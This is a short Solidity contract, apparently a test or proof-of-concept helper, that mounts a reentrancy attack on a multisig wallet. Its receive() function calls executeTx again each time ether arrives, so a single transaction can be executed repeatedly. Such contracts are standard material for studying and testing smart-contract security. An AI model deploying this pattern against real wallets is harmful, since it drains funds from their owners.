// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IMultisig {
    function executeTx(uint256 index) external;
}
contract Reentrancy {
    IMultisig public wallet;
    uint256 public storedIndex;

    constructor(address _wallet) {
        wallet = IMultisig(_wallet);
    }

    function setWallet(address _wallet) external {
        wallet = IMultisig(_wallet);
    }

    receive() external payable {
        wallet.executeTx(storedIndex);
    }

    function attack(uint256 index) external {
        storedIndex = index;
        wallet.executeTx(index);
    }
}